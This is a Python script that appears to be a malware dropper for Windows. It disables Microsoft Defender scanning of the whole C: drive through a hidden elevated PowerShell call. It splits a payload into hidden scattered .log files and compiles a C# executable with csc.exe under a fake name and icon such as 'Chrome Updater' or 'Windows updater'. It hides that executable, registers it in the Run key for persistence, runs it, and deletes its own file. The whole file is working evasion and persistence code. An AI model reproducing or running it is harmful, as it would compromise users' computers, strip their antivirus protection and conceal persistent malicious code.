# -*- coding: utf-8 -*-
import os
import random
import subprocess
import win32api
import win32con
import winreg

def writefile(path, data):
    with open(path, 'w', encoding='UTF-8') as f:
        f.write(data)

def readfile(path):
    with open(path, 'r', encoding='UTF-8') as f:
        data = f.read()
    return data

def make_hidden(file_path):
    try:
        win32api.SetFileAttributes(file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
    except:
        pass

def get_logo(name):
    LOGOS = {
        "PCHealthCheck": "addons/PCHealthCheck.ico",
        "Windows updater": "addons/WindowsUpdater.ico",
        "MSEdge updater": "addons/MsEdge.ico",
        "Chrome updater": "addons/Chrome.ico",
        "Google Crash Handler": "addons/Chrome.ico",
        "Java Update Checker": "addons/java.ico",
        "WindowsStore": "addons/WSStore.ico",
    }
    return LOGOS.get(name, None)

def generate_path(base_path, name_length=5):
    random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=name_length))
    return os.path.join(base_path, random_name + '.log')

def dav():
    try:
        command = 'Set-MpPreference -ExclusionPath c:\\'
        subprocess.run(['powershell', '-Command', f'Start-Process powershell -Verb runAs -ArgumentList "-Command {command}" -WindowStyle Hidden'], capture_output=False, text=False)
    except:
        pass
 
src_hashed = 'SRC_HASHED'
recompyler = r"""'RECOMPYLER'"""
possible_paths = [
    os.path.join(os.getenv('ProgramData')),
    os.getenv('TEMP'),
    os.getenv('APPDATA'),
    os.getenv('LOCALAPPDATA'),
    os.getenv('USERPROFILE')]

created_name = random.choice([
    'PCHealthCheck',
    'Windows updater',
    'MSEdge Updater',
    'Chrome Updater',
    'Google Crash Handler',
    'Java Update Checker',
    'WindowsStore'])

selected_paths = [
    generate_path(random.choice(possible_paths)) for _ in src_hashed]

for path, char in zip(selected_paths, src_hashed):
    writefile(path, char + "\n")
    make_hidden(path)

dav()
selected_paths = [s.replace('\\', '\\\\') for s in selected_paths]
recompyler_content = recompyler.replace('PARTS_PATH', '","'.join(selected_paths))
created_file = os.path.join(os.getenv('TEMP'), f"{created_name}.cs")
writefile(created_file, recompyler_content)
csc_path = os.path.join('C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319', 'csc.exe')
exe_path = random.choice(possible_paths)
exe_file = f'{exe_path}\\{created_name}.exe'
command_args = [
    csc_path,
    f'/out:{exe_file}',
    f'/win32icon:{get_logo(created_name)}',
    created_file,
]
with open(os.devnull, 'w') as devnull:
    subprocess.call(command_args, stdout=devnull, stderr=devnull)
make_hidden(exe_file)

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
winreg.SetValueEx(key, created_name, 0, winreg.REG_SZ, exe_file)

os.remove(created_file)
try:
    subprocess.call(exe_file)
except:
    pass
try: 
    os.remove(__file__)
except:
    pass